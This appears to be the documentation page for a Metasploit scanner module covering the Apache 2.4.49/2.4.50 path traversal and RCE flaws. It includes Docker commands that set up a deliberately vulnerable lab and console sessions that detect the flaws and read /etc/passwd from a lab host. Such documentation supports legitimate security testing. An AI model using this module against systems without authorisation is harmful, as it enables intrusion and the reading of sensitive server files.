This module scans for an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773)
and 2.4.50 (CVE-2021-42013).

A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a
path traversal attack to map URLs to files outside the expected document root.

If files outside of the document root are not protected by "require all denied" these requests can succeed.

Additionally this flaw could leak the source of interpreted files like CGI scripts.

If CGI scripts are also enabled for these aliased paths, this could allow for remote code execution.

It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient (CVE-2021-42013).

## Vulnerable Application

This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and Apache 2.4.50 and
not earlier versions.

### Make your lab

#### Path Traversal

```
docker run -dit --name CVE-2021-41773 -p 8080:80 -v /opt/apache2.4.49:/usr/local/apache2/htdocs httpd:2.4.49
docker exec -it CVE-2021-41773 sed -i "0,/denied/s/AllowOverride none/# AllowOverride None/" conf/httpd.conf
docker exec -it CVE-2021-41773 sed -i "0,/denied/s/denied/granted/" conf/httpd.conf
docker stop CVE-2021-41773
docker start CVE-2021-41773
```

--or--

```
docker run -dit --name CVE-2021-42013 -p 8080:80 -v /opt/apache2.4.50:/usr/local/apache2/htdocs httpd:2.4.50
docker exec -it CVE-2021-42013 sed -i "0,/denied/s/AllowOverride none/# AllowOverride None/" conf/httpd.conf
docker exec -it CVE-2021-42013 sed -i "0,/denied/s/denied/granted/" conf/httpd.conf
docker stop CVE-2021-42013
docker start CVE-2021-42013
```

#### Remote Code Execution

```
docker run -dit --name CVE-2021-41773 -p 8080:80 -v /opt/apache2.4.49:/usr/local/apache2/htdocs httpd:2.4.49
docker exec -it CVE-2021-41773 sed -i "0,/denied/s/AllowOverride none/# AllowOverride None/" conf/httpd.conf
docker exec -it CVE-2021-41773 sed -i "0,/denied/s/denied/granted/" conf/httpd.conf
docker exec -it CVE-2021-41773 sed -i -E "s|all denied|all granted|g; s|#(.* cgid_.*)|\1|g" conf/httpd.conf
docker stop CVE-2021-41773
docker start CVE-2021-41773
```

--or--

```
docker run -dit --name CVE-2021-42013 -p 8080:80 -v /opt/apache2.4.50:/usr/local/apache2/htdocs httpd:2.4.50
docker exec -it CVE-2021-42013 sed -i "0,/denied/s/AllowOverride none/# AllowOverride None/" conf/httpd.conf
docker exec -it CVE-2021-42013 sed -i "0,/denied/s/denied/granted/" conf/httpd.conf
docker exec -it CVE-2021-42013 sed -i -E "s|all denied|all granted|g; s|#(.* cgid_.*)|\1|g" conf/httpd.conf
docker stop CVE-2021-42013
docker start CVE-2021-42013
```

## Verification Steps

1. Start `msfconsole`
2. `use auxiliary/scanner/http/apache_normalize_path`
3. `set RHOSTS [IP]`
4. `run`

## Options

**CVE**

The vulnerability to use (Accepted: CVE-2021-41773, CVE-2021-42013). Default: CVE-2021-42013

**DEPTH**

Depth for path traversal. Default: 5

**FILEPATH**

The file you want to read. Default: `/etc/passwd`

**TARGETURI**

Base path. Default: `/cgi-bin`

## Actions

**CHECK_TRAVERSAL**

Check the vulnerability exposure, by default.

**CHECK_RCE**

Check the remote code execution.

**READ_FILE**

Read remote file on the server.

## Scenarios

### Check for vulnerability

#### CVE-2021-42013 (by default)

```
msf6 > use auxiliary/scanner/http/apache_normalize_path
msf6 auxiliary(scanner/http/apache_normalize_path) > setg rhosts 172.20.4.11
rhosts => 172.20.4.11
msf6 auxiliary(scanner/http/apache_normalize_path) > setg rport 8080
rport => 8080
msf6 auxiliary(scanner/http/apache_normalize_path) > setg ssl false
[!] Changing the SSL option's value may require changing RPORT!
ssl => false
msf6 auxiliary(scanner/http/apache_normalize_path) > setg verbose true
verbose => true
msf6 auxiliary(scanner/http/apache_normalize_path) > run

[+] http://172.20.4.11:8080 - The target is vulnerable to CVE-2021-42013.
[*] Obtained HTTP response code 403.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/apache_normalize_path) > 
```

#### CVE-2021-41773

```
msf6 auxiliary(scanner/http/apache_normalize_path) > use auxiliary/scanner/http/apache_normalize_path
msf6 auxiliary(scanner/http/apache_normalize_path) > setg rhosts 172.20.4.11
rhosts => 172.20.4.11
msf6 auxiliary(scanner/http/apache_normalize_path) > setg rport 8080
rport => 8080
msf6 auxiliary(scanner/http/apache_normalize_path) > setg ssl false
ssl => false
msf6 auxiliary(scanner/http/apache_normalize_path) > setg verbose true
verbose => true
msf6 auxiliary(scanner/http/apache_normalize_path) > setg cve CVE-2021-41773
cve => CVE-2021-41773
msf6 auxiliary(scanner/http/apache_normalize_path) > run

[+] http://172.20.4.11:8080 - The target is vulnerable to CVE-2021-41773.
[*] Obtained HTTP response code 403.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/apache_normalize_path) >
```

#### Check for RCE

```
msf6 auxiliary(scanner/http/apache_normalize_path) > use auxiliary/scanner/http/apache_normalize_path
msf6 auxiliary(scanner/http/apache_normalize_path) > setg rhosts 172.20.4.11
rhosts => 172.20.4.11
msf6 auxiliary(scanner/http/apache_normalize_path) > setg rport 8080
rport => 8080
msf6 auxiliary(scanner/http/apache_normalize_path) > setg ssl false
ssl => false
msf6 auxiliary(scanner/http/apache_normalize_path) > setg verbose true
verbose => true
msf6 auxiliary(scanner/http/apache_normalize_path) > setg action CHECK_RCE
action => CHECK_RCE
msf6 auxiliary(scanner/http/apache_normalize_path) > run

[+] http://172.20.4.11:8080 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/apache_normalize_path) > 
```

### Read file

```
msf6 auxiliary(scanner/http/apache_normalize_path) > use auxiliary/scanner/http/apache_normalize_path
msf6 auxiliary(scanner/http/apache_normalize_path) > setg rhosts 172.20.4.11
rhosts => 172.20.4.11
msf6 auxiliary(scanner/http/apache_normalize_path) > setg rport 8080
rport => 8080
msf6 auxiliary(scanner/http/apache_normalize_path) > setg ssl false
ssl => false
msf6 auxiliary(scanner/http/apache_normalize_path) > setg verbose true
verbose => true
msf6 auxiliary(scanner/http/apache_normalize_path) > setg action READ_FILE
action => READ_FILE
msf6 auxiliary(scanner/http/apache_normalize_path) > run

[*] Obtained HTTP response code 200.
[+] 172.20.4.11:8080 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

[+] File saved in: /home/mekhalleh/.msf4/loot/20211010161150_default_172.20.4.11_apache.traversal_540877.bin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/apache_normalize_path) > 
```
## References

  1. <https://httpd.apache.org/security/vulnerabilities_24.html>
  2. <https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse>
  3. <https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml>
  4. <https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74>
  5. <https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis>
